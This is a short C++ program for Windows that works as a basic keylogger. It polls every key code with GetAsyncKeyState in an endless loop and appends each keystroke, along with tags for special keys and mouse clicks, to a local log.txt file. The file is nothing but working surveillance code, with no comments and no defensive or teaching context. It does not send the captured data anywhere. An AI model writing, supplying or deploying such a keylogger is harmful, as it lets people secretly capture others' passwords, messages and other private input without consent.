#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void startLogging();

int main()
{
    startLogging();
    return 0;
}

void startLogging()
{

    char c;
    while (true)
    {
        for (c = 0; c <= 254; c++)
        {
            if (GetAsyncKeyState(c) & 0x1)
            {
                ofstream log;
                log.open("log.txt", ios::app);
                switch(c)
                {
                case VK_BACK:
                    log << "[bk]";
                    break;
                case VK_RETURN:
                    log << "[et]";
                    break;
                case VK_SHIFT:
                    log << "[sft]";
                    break;
                case VK_CONTROL:
                    log << "[ctrl]";
                    break;
                case VK_CAPITAL:
                    log << "[cap]";
                    break;
                case VK_TAB:
                    log << "[tab]";
                    break;
                case VK_MENU:
                    log << "[alt]";
                    break;
                case VK_LBUTTON:
                    log << "[lk]";
                    break;
                case VK_RBUTTON:
                    log << "[rk]";
                    break;
                default:
                    log << c;
                }
            }
        }
    }
}